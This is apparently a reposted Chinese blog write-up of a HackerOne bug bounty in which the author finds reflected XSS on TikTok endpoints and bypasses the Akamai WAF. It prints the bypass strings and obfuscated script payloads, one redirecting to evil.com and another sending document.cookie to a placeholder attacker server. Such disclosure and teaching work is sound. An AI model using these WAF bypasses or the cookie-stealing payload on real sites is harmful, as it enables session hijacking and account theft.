> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwOTE5MDY5NA==&mid=2247506998&idx=1&sn=52801a9414af3059d542caf9da05aa53

#  我如何在 TikTok 漏洞赏金计划中赚到 3000 美元  
haidragon  安全狗的自我修养   2025-07-17 04:10  
  
Hackerone.com 上的 TikTok 漏洞赏金计划  
  
  
那只是一个普通的夜晚。一个朋友邀请我去玩《Valorant》（游戏）——典型的夜间例行活动。但不知何故，我拒绝了。我打开了我的 Burpsuite，开始四处寻找赏金任务。这**真是我做过的最棒的决定。**  
  
因为那天晚上，我**在 TikTok 上发现了三个漏洞**，最终让我总共赚了**3000 美元**。  
# 侦察游戏  
  
我的旅程始于简单的侦察。我曾经
```
urlscan.io
```

扫描过所有与TikTok域名相关的端点。经过一番挖掘，我最终得到了一个**庞大的列表——大约有10,000个URL**。  
  
手动滚动浏览（没错，就是手动），我发现一个端点位于一个看起来像是活动共享功能的路径下。该 URL 附带了几个参数——这立刻激起了我的好奇心。（无法分享完整的端点）  
  
我开始尝试这个
```
region
```

参数。为了测试反射，我添加了这个无害的payload：  
  
?region=id'">  
<  
u  
>  
testest  
</  
u  
>  

```


```

  
你猜怎么着？  
  
**它反映得很干净。没有经过任何清理。没有经过任何编码。**  
# 进入 WAF — Akamai  
  
我心想：“好吧……这可能很有趣。” 所以我用一个经典的有效载荷进行了测试：  
  
">  
<  
img  
src  
=  
x  
onerror  
=  
alert(document.domain)  
>  
  
**被Akamai**屏蔽——TikTok 的 WAF。而且不是普通的 WAF……**难度很高**。  
  
游戏开始。  
# 绕过尝试  
  
我开始深入研究**Akamai WAF 绕过技术**。我发现了一些关于字符串混淆、大小写敏感和标签规避的精彩文章。  
  
一些常见的尝试包括：  
  
</  
ScRiPt  
>  
      → blocked    
</  
SCRIPT  
>  
      → blocked    
</  
ScRpt  
>  
       → not blocked, but also invalid    
</Script+xxx>  → bypassed briefly, but eventually got filtered again  
  
我知道我需要一些更有创意的东西。  
# 有效载荷的演变  
  
经过多次失败的尝试，我想到了这个**看起来很奇怪但有效的**绕过字符串：  
  
}<x>xxx<!--><!>+>+></Script+xxx></script%20x></x><x>xxx<!--><!>+>+>  
  
这样就绕过了过滤——**但是 alert()、confirm() 和 prompt()**在运行时都被阻止了。因此，我选择谨慎行事，先报告了该漏洞，并使用了**开放的重定向有效载荷**，以避免潜在的重复提交。  
  
完整的有效载荷有点疯狂，看起来像这样：  
  
}<x>xxx<!--><!>+>+></Script+xxx><Script+xxx>Object.prototype.BOOMR = 1;  
Object.prototype.url = 'https://portswigger-labs.net/xss/xss.js';  
location.replace('https://evil.com');</script%20x></x><x>xxx<!--><!>+>+>  
  
两天后，我收到了 HackerOne Triage 的回复：  
  
  
  
# 构造一个真正的XSS  
  
我又回到了绘图板上。由于直接访问
```
alert()
```

被屏蔽了，我尝试**使用混淆访问来破解它**：  
  
window  
/*xxx*/  
 ;  
  
全部有效载荷：  
  
<x>xxx<!--><!>+>+></Script+xxx><script%20x>window/*xxx*/['al'%2b'ert'](1);//</script%20x></x><x>xxx<!--><!>+>+>  
  
成功了。我更新了 PoC 并再次发送了它。  
  
内部分类小组回复：  
  
  
  
  
已接受的挑战。  
  
我继续使用这个最终的有效载荷来窃取cookie：  

```

```

window/*xxx*/['loca'+'tion'] ='http://<your-server>?cookie='+document/*xxx*/['coo'+'kie'];  
  
  
  
轰！确认有效XSS攻击。同一天，**1000美元的悬赏金**落入。  
  
  
  
# 额外奖励：另外两个 Bug  
  
这次胜利之后，我继续深入研究同一路径家族中的更多端点。最终，我又发现了**两个具有相同漏洞的端点**。  
  
同样的技术。同样的XSS。同样的悬赏：**每人1000美元。**  
# 💸 最终结果  
- 第一个漏洞：1000美元  
- 第二个漏洞：1000 美元  
- 第三个漏洞：1000美元  
总计**：3,000 美元**  
  
那天晚上我甚至不需要玩 Valorant。  
  
  
  
# 对黑客同仁的最后思考  
  
漏洞赏金不仅仅关乎技巧——它关乎耐心、侦察、创造力和时机。有时候，**拒绝游戏邀请就能让你多赚几千美元**😂  
  
致所有漏洞猎人：**永远不要低估反射参数**。最简单的漏洞也能带来意想不到的回报——前提是，你知道如何正确构建你的payload。  
  
继续学习，注意安全。  
  
  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
-   
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
  
  
